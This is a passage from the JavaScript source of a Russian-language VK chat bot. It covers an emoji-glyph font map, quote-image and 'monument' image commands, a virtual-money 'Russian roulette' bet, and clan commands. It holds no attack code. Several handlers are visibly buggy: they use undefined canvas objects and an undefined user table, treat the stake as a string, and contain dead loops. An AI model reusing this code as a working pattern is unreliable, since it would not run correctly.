 	ю: `\n◽◽◽◽◽◽◽◽◽\n◽◼◽◽◼◼◼◽◽\n◽◼◽◼◽◽◽◼◽\n◽◼◽◼◽◽◽◼◽\n◽◼◼◼◽◽◽◼◽\n◽◼◽◼◽◽◽◼◽\n◽◼◽◼◽◽◽◼◽\n◽◼◽◽◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
 	я: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◽◽◼◽◼◽◽\n◽◽◽◼◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
//--------------------------------\\
А: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
Б: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
В: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
Г: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
Д: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◼◼◼◽◽\n◽◽◽◼◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◼◼◼◼◼◼◼◽\n◽◼◽◽◽◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
Е: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
Ё: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◽◼◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
Ж: `\n◽◽◽◽◽◽◽◽◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◽◼◼◼◼◼◽◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
З: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
И: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◼◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◼◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
Й: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◼◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◼◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
К: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◼◽◽◽\n◽◽◼◽◼◽◽◽◽\n◽◽◼◼◽◽◽◽◽\n◽◽◼◽◼◽◽◽◽\n◽◽◼◽◽◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
Л: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◼◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
М: `\n◽◽◽◽◽◽◽◽◽\n◽◼◽◽◽◽◽◼◽\n◽◼◼◽◽◽◼◼◽\n◽◼◽◼◽◼◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
Н: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
О: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
П: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
Р: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
С: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
Т: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
у: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
ф: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◼◽◽◼◽◽◼◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
х: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◽◼◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◼◽◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
ц: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◼◼◽\n◽◽◽◽◽◽◽◼◽`,
Ч: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
Ш: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
Щ: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◼◼◼◼◼◽\n◽◽◽◽◽◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
Ъ: `\n◽◽◽◽◽◽◽◽◽\n◽◼◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
Ы: `\n◽◽◽◽◽◽◽◽◽\n◽◼◽◽◽◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◼◽◽◽◽◽◼◽\n◽◼◼◼◼◽◽◼◽\n◽◼◽◽◽◼◽◼◽\n◽◼◽◽◽◼◽◼◽\n◽◼◼◼◼◽◽◼◽\n◽◽◽◽◽◽◽◽◽`,
Ь: `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
Э: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
Ю: `\n◽◽◽◽◽◽◽◽◽\n◽◼◽◽◼◼◼◽◽\n◽◼◽◼◽◽◽◼◽\n◽◼◽◼◽◽◽◼◽\n◽◼◼◼◽◽◽◼◽\n◽◼◽◼◽◽◽◼◽\n◽◼◽◼◽◽◽◼◽\n◽◼◽◽◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
Я: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◽◽◼◽◼◽◽\n◽◽◽◼◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◽◽◽`,
" ": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
_: `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"?": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◼◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"!": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"1": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◼◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"2": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◼◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◼◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◽◽◽`,
"3": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◼◼◽◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"4": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◽◽◼◽◽◽\n◽◽◽◽◼◼◽◽◽\n◽◽◽◼◽◼◽◽◽\n◽◽◼◽◽◼◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◼◽◽◽\n◽◽◽◽◽◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"5": `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"6": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◽◽◽\n◽◽◼◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"7": `\n◽◽◽◽◽◽◽◽◽\n◽◽◼◼◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◽◽◽◼◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◼◽◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"8": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"9": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◼◽◽\n◽◽◽◽◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`,
"0": `\n◽◽◽◽◽◽◽◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◼◽◽◼◼◽◽\n◽◽◼◽◼◽◼◽◽\n◽◽◼◼◽◽◼◽◽\n◽◽◼◽◽◽◼◽◽\n◽◽◽◼◼◼◽◽◽\n◽◽◽◽◽◽◽◽◽`
}

vk.updates.hear(/^(?:цитатни)/i, async(message) => {
	if(message.forwards[0]){
		message.send(`Секундочку, делаю фото.`)

		const { createCanvas, loadImage } = require('canvas');
		const canvas = createCanvas(800, 200);
		const ctx = canvas.getContext('2d');

		const chit = message.forwards[0].text;
		const use_id = message.forwards[0].senderId;

		const [ava_info] = await vk.api.users.get({
			user_id: use_id,
			fields: "photo_200"
		});

		const [user_info] = await vk.api.users.get({
			user_id: use_id
		});

		if(chit.length < 46){
			for(var i = 0; i < chit.length; ++i){
				if(chit[i] < 46 && chit[i] == " "){

				}
			}
		}

		ctx.fillStyle = "#000000";
		ctx.fillRect(0, 0, 1000, 1000);
		ctx.fillStyle = "#FFFFFF";

		ctx.font = '20px Roboto';
		ctx.fillText(`Цитаты великих людей:`, 220, 20);

		ctx.font = '23px Roboto';
		ctx.fillText(`«${chit.match(/.{1,45}/g).join("\n")}»`, 220, 80);

        //ctx.textAlign = "right";
        ctx.font = '22px Roboto';
        ctx.fillText(`© ${user_info.first_name} ${user_info.last_name}`, 530, 180);

        const mychit = await loadImage(ava_info.photo_200); 
        ctx.drawImage(mychit, 0, 0); 

        return message.sendPhoto({
        	value: canvas.toBuffer(),
        	options:{
        		filename: 'cit.png'
        	}
        });   
    }  
    if(message.replyMessage){
    	message.send(`Секундочку, делаю фото.`)

    	const { createCanvas, loadImage } = require('canvas');
    	const canvas = createCanvas(800, 200);
    	const ctx = canvas.getContext('2d');

    	const chit = message.replyMessage.text;
    	const use_id = message.replyMessage.senderId;

    	const [ava_info] = await vk.api.users.get({
    		user_id: use_id,
    		fields: "photo_200"
    	});

    	const [user_info] = await vk.api.users.get({
    		user_id: use_id
    	});

    	if(chit.length < 46){
    		for(var i = 0; i < chit.length; ++i){
    			if(chit[i] < 46 && chit[i] == " "){

    			}
    		}
    	}

    	ctx.fillStyle = "#000000";
    	ctx.fillRect(0, 0, 1000, 1000);
    	ctx.fillStyle = "#FFFFFF";

    	ctx.font = '20px Roboto';
    	ctx.fillText(`Цитаты великих людей:`, 220, 20);

    	ctx.font = '23px Roboto';
    	ctx.fillText(`«${chit.match(/.{1,45}/g).join("\n")}»`, 220, 80);

        //ctx.textAlign = "right";
        ctx.font = '22px Roboto';
        ctx.fillText(`© ${user_info.first_name} ${user_info.last_name}`, 530, 180);

        const mychit = await loadImage(ava_info.photo_200); 
        ctx.drawImage(mychit, 0, 0); 

        return message.sendPhoto({
        	value: canvas.toBuffer(),
        	options:{
        		filename: 'cit.png'
        	}
        });   
    }
});

vk.updates.hear(/^(?:сохра|сохранёнка|сохраненка)/i, async(message) => {
	let {
		items
	} = await ussr.api.wall.get({
		owner_id: -49468741,
		offset: 1,
		count: 100
	});
	let item = utils.pick(items);
	item = item.attachments[0].photo;
	await message.send({
		attachment: "photo" + item.owner_id + "_" + item.id
	});
});

vk.updates.hear(/^(?:рр|pp|русская рулетка)\s?([^]+)?/i, message => {
	let g = message.$match[1];
	let a = acc.users[user_id(message.user)]
	if (a.balance < g) return message.send(`💡 Ваш баланс меньше вашей ставки, повторите попытку!`);
	if (!Number(g)) return message.send(`💡 Ставка должна быть цифрового вида!`);
	if (!g) return message.send(`💡 Укажите ставку! "рр [ставка]"`);
	if (a.rr_status != false) return message.send(`💡 Вы уже начали играть в Русскую рулетку, для выстрела напишите "Выстрел"`);
	a.rr_status = true;
	a.rr_stavka = g;
	a.balance -= g;
	return message.send(`💡 Вы начали играть в Русскую Рулетку\n💰 Ваша ставка: ${utils.sp(a.rr_stavka)}$\n\n💡 Для выстрела напишите "Выстрел"`);
});
////////////////////////////////////////////
vk.updates.hear(/^(?:выстрел)/i, message => {
	let a = acc.users[user_id(message.user)]
	if (a.rr_status !== true) return message.send(`👀 Вы не начали игру, что бы начать играть, напишите "рр [ставка]"`);

	if (a.rr == 0) {
		a.balance += a.rr_stavka;
		a.rr = 3;
		a.rr_status = false;
		return message.send(`😱 Ого! Все 3 попытки прошли без выстрелов! Поздравляю, забирайте свой выигрыш в размере ${utils.sp(a.rr_stavka)}$`);
	}
	if (utils.random(1, 2) == 1) {
		a.rr -= 1;
		a.rr_stavka *= 2;
		return message.send(`😱 Вы сделали выстрел, итог: Успешно! Выстрела не произошло.\n☝ Ваша ставка удвоилась! (${utils.sp(a.rr_stavka)}$)\n🔫 Для ещё одного выстрела, напишите "Выстрел"`);
	} else {
		a.rr_status = false;
		a.rr_stavka = false;
		a.rr = 3;
		return message.send(`🤕 Выстрел произошёл, вы проиграли свою ставку!`);
	}
});

vk.updates.hear(/^(?:памятник)/i, async(message) => {
	if (message.forwards[0]) {

		message.send(`Секундочку, делаю фото...`)
		const use_id = message.forwards[0].senderId;
		const Image = Canvas.Image;
		const [ava_info] = await vk.api.users.get({
			user_id: use_id,
			fields: "photo_200"
		});

		const [user_info] = await vk.api.users.get({
			user_id: use_id
		});

		const img = new Image();
		img.src = 'nadg.png';
		ctx.drawImage(img, 0, 0);

		ctx.font = '30px Roboto';
		ctx.fillStyle = "#F4ECD2";
		ctx.fillText(`${user_info.first_name}`, 220, 310);

		ctx.font = '30px Roboto';
		ctx.fillStyle = "#D8A903";
		ctx.fillText(`${time(5)}`, 200, 386);

		const mychit = await loadImage(ava_info.photo_200);
		ctx.drawImage(mychit, 215, 60);

		return message.sendPhoto(canvas.toBuffer());
	}
	if (message.replyMessage) {

		message.send(`Секундочку, делаю фото...`)
		const use_id = message.replyMessage.senderId;
		const Image = Canvas.Image;
		const [ava_info] = await vk.api.users.get({
			user_id: use_id,
			fields: "photo_200"
		});

		const [user_info] = await vk.api.users.get({
			user_id: use_id
		});

		const img = new Image();
		img.src = 'nadg.png';
		ctx.drawImage(img, 0, 0);

		ctx.font = '30px Roboto';
		ctx.fillStyle = "#F4ECD2";
		ctx.fillText(`${user_info.first_name}`, 220, 310);

		ctx.font = '30px Roboto';
		ctx.fillStyle = "#D8A903";
		ctx.fillText(`${time(5)}`, 200, 386);

		const mychit = await loadImage(ava_info.photo_200);
		ctx.drawImage(mychit, 215, 60);

		return message.sendPhoto(canvas.toBuffer());
	}
});

cm.hear(/^(?:clan create|создать клан|addclan|клан создать)\s(.*)/i, message => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid
	let name = message.$match[1];
	if(clans[a.cid]) return message.send(`У вас уже создан клан/Вы состоите в клане.`);
	if(a.balance < 500000000) return message.send(`Для создания клана, нужно иметь ${utils.sp(500000000)}$`)
		config.cid += 1
	if(!clans[config.cid]) {
		clans[config.cid] = {
			owner: a.number,
			users: {},
			number: config.cid,
			name: name,
			balance: 0,
			open: true,
			price: 100,
			people: 1,
			war: false,
			invites: {}
		}
		a.cid = config.cid;
		clans[config.cid].users[a.number] = {
			status: 2
		}
	}
	return message.send(`Клан под названием "${name}" успешно создан.\nБольше информации по команде "Clan help"`)
})
//------------------------------\\
cm.hear(/^(?:клан покинуть)/i,(message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	if(!clans[id]) return message.send(`Вы не состоите в клане!`);
	if (clans[id].users[a.number].status == 2) return message.send(`Вы не можете покинуть созданный вами клан!`);

	a.cid = false;
	delete clans[id].users[a.number];
	return message.send(`Вы успешно покинули клан!`);
});
//------------------------------\\
cm.hear(/^(?:Клан открыть)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	if (!clans[id]) return message.send(`У Вас нет клана.`);
	if (clans[id].users[a.number].status < 2) return message.send(`Данная команда Вам не доступна.`);
	if (clans[id].open != false) return message.send(`Клан уже открыт.`)

		clans[id].open = true;

	return message.send(`Вы успешно открыли клан.`);
});
//------------------------------\\
cm.hear(/^(?:Клан закрыть)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	if (!clans[id]) return message.send(`У Вас нет клана.`);
	if (clans[id].users[a.number].status < 2) return message.send(`Данная команда Вам не доступна.`);
	if (clans[id].open != true) return message.send(`Клан уже закрыт.`)

		clans[id].open = false;

	return message.send(`Вы успешно закрыли клан.`);
});
//------------------------------\\
cm.hear(/^(?:клан цена)\s?(.*)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	let amount = Number(message.$match[1]);  
	if (!clans[id]) return message.send(`У Вас нет клана.`);
	if (clans[id].users[a.number].status < 2) return message.send(`Данная команда вам не доступна.`);

	clans[id].price = amount;
	return message.send(`Теперь что бы войти в клан, нужно ${utils.sp(amount)}$`);
});
//------------------------------\\
cm.hear(/^(?:клан принять)\s?([0-9]+)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = Number(message.$match[1]);
	let user = acc.users[id];    
	if(!clans[a.cid]) return message.send(`У Вас нет клана!`);
	if(!message.$match[1]) return message.send(`Укажите идентификатор пользователя.`);
	if(!clans[a.cid].invites[id]) return message.send(`Заявка с таким идентификатором не найдена.`);
	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна`);
	if(user.cid) return message.send(`💀 » Данный человек уже вступил в клан`);
	if(user.balance < clans[a.cid].price) return message.send(`💀 » У пользователя не хватает денег`);

	user.balance -= clans[a.cid].price;
	user.cid = a.cid;

	if(!clans[a.cid].users[id])
		clans[a.cid].users[id] = {
			status: 0
		};
		delete clans[a.cid].invites[id];
		return message.send(`Игрок "@id${acc.users[id].id} (${acc.users[id].prefix})" был принят в клан "${clans[a.cid].name}"`);
	});
//------------------------------\\
cm.hear(/^(?:клан заявки)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = a.cid;
	if (!clans[id]) return message.send(`Вы не состоите в клане`);
	let text = `Заявки на вступление в клан "${clans[a.cid].name}"\n`;
	if (clans[id].users[a.number].status < 1) return message.send(`Данная команда вам не доступна`);
	for(ids in clans[id].invites){

		text += `@id${acc.users[ids].id}(${acc.users[ids].prefix}) [ID: ${ids}] - Ждёт одобрения\n`;

	}
	return message.send(text);
});
//------------------------------\\
cm.hear(/^(?:Клан раздать)\s?(.*)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	message.$match[1] = utils.match(message.$match[1]);
	let id = a.cid;
	let sum = Math.round(message.$match[1] / clans[id].people);
	if(!message.$match[1]) return   
		if(clans[id].people < 3) return message.send(`В клане должно быть не меньше 3-х участников.`)
			if (clans[id].users[a.number].status < 2) return message.send(`Данная команда вам не доступна`)
				if(message.$match[1] > clans[id].balance) return message.send(`На балансе клана нет столько денег.`);

			clans[id].balance -= message.$match[1];

			for(ids in clans[id].users){
				users[ids].balance += sum;
			}

			return message.send(`Деньги были поделены на всех участников.\nКаждый участник получил по ${utils.sp(sum)}`);
		});
//------------------------------\\
cm.hear(/^(?:клан вступить)\s?([0-9]+)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = Number(message.$match[1]);
	if(!message.$match[1]) return
		if(clans[a.cid]) return message.send(`Вы уже состоите в клане "${clans[a.cid].name}"`);
	if(!clans[id]) return message.send(`💀 »  Данного клана не существует.`);

	if(!clans[id].open) {
		if(!clans[id].invites)
			clans[id].invites = {}

		if(!clans[id].invites[a.number])
			clans[id].invites[a.number] = {
				i: true
			};

			return message.reply(`Заявка на вступление была отправлена создателю клана.`);
		} else if (clans[id].open) {
			if (a.balance < clans[id].price) return message.send(`У Вас недостаточно денег, что бы войти в этот клан.`);
			a.balance -= clans[id].price;
			a.cid = id;
			clans[id].people += 1;
			clans[id].balance += clans[id].price;
			if(!clans[id].users[a.number]) {
				clans[id].users[a.number] = {
					status: 0
				}
			}

			return message.send(`Вы успешно вошли в клан "${clans[message.$match[1]].name}".\nБольше информации по команде "Clan Help"`);
		}
	});
//------------------------------\\
cm.hear(/^(?:клан название)\s?([^]+)?/i, (message) => {
	let a = acc.users[user_id(message.user)]
	if(!message.$match[1]) return;
	if(!clans[a.cid]) return message.send(`У Вас нет клана.`);
	if(clans[a.cid].users[a.number].status < 2) return message.send(`Данная команда Вам не доступна`);
